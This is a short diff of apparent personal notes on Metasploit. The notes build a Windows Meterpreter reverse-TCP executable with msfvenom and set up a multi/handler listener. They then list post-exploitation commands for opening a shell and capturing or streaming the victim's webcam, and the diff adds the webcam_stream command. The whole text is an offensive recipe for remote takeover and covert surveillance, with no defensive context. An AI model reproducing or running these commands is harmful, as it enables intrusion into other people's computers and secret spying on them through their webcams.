@@ -2,13 +2,12 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=1234 -f exe > payload
 shell
 webcam_list
 webcam_snap
-
-
----------------
+webcam_stream -i 
+------------------------------------
 msfconsole
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
-set LHOST YOUR_IP
+set LHOST IP
 set LPORT 4444
 exploit
 
